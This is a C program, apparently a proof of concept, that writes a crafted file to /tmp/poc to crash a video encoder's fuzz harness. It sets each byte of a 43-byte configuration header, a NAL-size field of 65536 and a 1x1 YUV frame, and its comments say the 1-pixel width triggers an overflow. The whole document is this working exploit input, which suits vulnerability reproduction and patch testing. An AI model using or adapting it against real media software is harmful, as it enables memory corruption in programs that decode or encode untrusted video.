#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    // 43-byte configuration header (big-endian where applicable)
    // Bytes 0-1: Width (big-endian 16-bit) = 0x0001 (1 pixel) - triggers overflow
    fputc(0x00, f); fputc(0x01, f);
    // Bytes 2-3: Height (big-endian 16-bit) = 0x0001 (1 pixel)
    fputc(0x00, f); fputc(0x01, f);
    // Byte 4: Color format = IV_YUV_420P (0)
    fputc(0x00, f);
    // Byte 5: Arch type = ARCH_ARM_NONEON (0)
    fputc(0x00, f);
    // Byte 6: RC mode = IVE_RC_STORAGE (1)
    fputc(0x01, f);
    // Byte 7: Num cores = 0 (maps to 1 core)
    fputc(0x00, f);
    // Byte 8: Num B frames = 0
    fputc(0x00, f);
    // Byte 9: Enc speed = IVE_NORMAL (3)
    fputc(0x03, f);
    // Byte 10: Constrained intra flag = 0
    fputc(0x00, f);
    // Byte 11: Intra 4x4 = 0
    fputc(0x00, f);
    // Byte 12: I frame QP = 22
    fputc(0x16, f);
    // Byte 13: P frame QP = 28
    fputc(0x1C, f);
    // Byte 14: B frame QP = 22
    fputc(0x16, f);
    // Bytes 15-16: Bitrate (big-endian 16-bit) = 0
    fputc(0x00, f); fputc(0x00, f);
    // Byte 17: Frame rate = 30
    fputc(0x1E, f);
    // Byte 18: Intra refresh = 31
    fputc(0x1F, f);
    // Byte 19: Enable half-pel = 1
    fputc(0x01, f);
    // Byte 20: Enable q-pel = 1
    fputc(0x01, f);
    // Byte 21: ME speed preset index = 0
    fputc(0x00, f);
    // Byte 22: AIR mode = IVE_AIR_MODE_NONE (0)
    fputc(0x00, f);
    // Byte 23: Disable deblock level = 0
    fputc(0x00, f);
    // Byte 24: Search range X = 64
    fputc(0x40, f);
    // Byte 25: Search range Y = 48
    fputc(0x30, f);
    // Byte 26: I interval = 0 (maps to 1)
    fputc(0x00, f);
    // Byte 27: IDR interval = 0 (maps to 1)
    fputc(0x00, f);
    // Bytes 28-42: Remaining 15 bytes = all zeros
    for (int i = 0; i < 15; i++) fputc(0x00, f);

    // 4-byte NAL-size field (little-endian) = 0x00010000 (65536)
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);

    // YUV420P data for 1x1 frame
    // Y plane: 1 byte
    fputc(0x80, f);
    // U plane: 0 bytes (width/2 * height/2 = 0)
    // V plane: 0 bytes

    fclose(f);
    return 0;
}